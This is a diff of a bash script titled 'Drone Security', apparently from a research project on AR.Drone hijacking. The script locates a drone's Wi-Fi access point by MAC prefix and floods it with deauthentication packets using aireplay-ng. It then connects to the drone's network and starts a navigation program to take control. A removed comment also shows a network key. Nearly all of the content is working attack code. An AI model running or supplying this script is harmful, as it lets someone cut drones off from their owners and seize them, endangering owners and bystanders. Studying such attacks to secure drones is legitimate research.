@@ -17,20 +17,20 @@ echo -e "\t*   Drone Security    * "
 echo -e "\t***********************"
 
 status=0
-name="AP_Te" #
+MAC_target="90:03:B7" #
 delay_new_search=10
 n_ping=5
-address_to_ping="192.168.1.253"
+address_to_ping="192.168.1.1"
 
 
 
 airmon="airmon-ng"
 airodump="airodump-ng"
 aireplay="aireplay-ng"
-jamming_packages=50
+jamming_packages=10
 
 
-echo -e "\n\n Looking for an AP with: $name* as SSID"
+echo -e "\n\n Looking for an AP with: $MAC_target* as MAC Address"
 
 # Boucle pour trouver le signal du drone
 while [  $status = 0 ]; do
@@ -38,8 +38,8 @@ while [  $status = 0 ]; do
 	# On scan et on fait le parsing avec 'iw scan wlan0'...
 	sudo ./iwScanParser.sh
 
-	if (cat iwScan_Results.WSP | grep $name); then
-		SSID_target=`cat iwScan_Results.WSP | grep $name |  awk '{print $3;}'`;
+	if (cat iwScan_Results.WSP | grep $MAC_target); then
+		SSID_target=`cat iwScan_Results.WSP | grep $MAC_target |  awk '{print $4;}'`;
 		Channel_target=`cat iwScan_Results.WSP | grep $SSID_target |  awk '{print $2;}'`;
 		SSID_MAC_target=`cat iwScan_Results.WSP | grep $SSID_target |  awk '{print $1;}'`;
 			echo -e "An AP with the string '$name' has been found!"
@@ -48,7 +48,7 @@ while [  $status = 0 ]; do
 			echo -e " MAC:\t\t \e[92m$SSID_MAC_target\e[0m"
 		status=1 #ca nous aide a sortir du boucle
 	else
-		echo -e "An AP with the string '$name' has not been found! we will try again in $delay seconds..."
+		echo -e "An AP with the MAC '$MAC_target' has not been found! we will try again in $delay_new_search seconds..."
 		sleep $delay_new_search
 	fi
 done
@@ -67,8 +67,7 @@ done
 	sleep 10
 	sudo pkill airodump-ng
 
-	echo -e "\n Jamming access point (AP)..."
-	#sudo $aireplay -0 $jamming_packages -a $SSID_MAC_target -c 74:E2:F5:0B:8A:A2 wlan0
+	echo -e "\n Jamming the access point (Drone)..."
 	sudo $aireplay -0 $jamming_packages -a $SSID_MAC_target wlan0
 	
 	echo -e "\n Restoring normal mode for wlan0..."
@@ -81,7 +80,7 @@ done
 	sudo service network-manager stop
 
 	echo -e "\n Connecting to $SSID_target..."
-	sudo iwconfig wlan0 essid $SSID_target #key s:12ClaurE34
+	sudo iwconfig wlan0 essid $SSID_target
 
 	#echo -e "\n\nSetting static IP address..."
 	#ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up
@@ -97,12 +96,12 @@ done
 		echo -e "\e[91m   No connection!!\e[0m"
 	else
 		echo -e "\e[92m   Connection established\e[0m, now you are connected to: \e[92m$SSID_target\e[0m"
+		/home/oscarmike/Documents/CSR/CSR_DroneSecurity/ARDrone_SDK_2_0_1/Examples/Linux/Build/Release/ardrone_navigation
 	fi
 
-	echo -e "\n Sleeping for 10 seconds..."
-	sleep 10
+
 
 	echo -e "\n Enabling Network Manager..."
 	sudo service network-manager start
 	
-
+	rm mesures_2015*
